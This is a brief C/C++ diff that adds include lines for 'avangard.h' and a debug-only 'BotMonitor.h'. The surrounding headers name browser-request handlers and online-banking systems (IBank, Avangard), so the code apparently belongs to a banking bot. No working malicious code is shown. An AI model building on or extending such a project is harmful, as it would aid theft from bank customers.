@@ -5,7 +5,6 @@
 //
 /*--------------------------------------------------------------------------*/
 
-
 #include "InternetExplorer.h" // Обработка запросов InternetExplorer
 #include "Firefox.h"
 #include "Opera.h"
@@ -46,6 +45,12 @@
 #include "IBankSystem.h"
 #include "Ibank.h"
 #include "JavaConfig.h"
+#include "avangard.h"
 
 #include "Avangard.h"
+
+#ifdef  DEBUGCONFIG
+	#include "BotMonitor.h"
+#endif
+
 
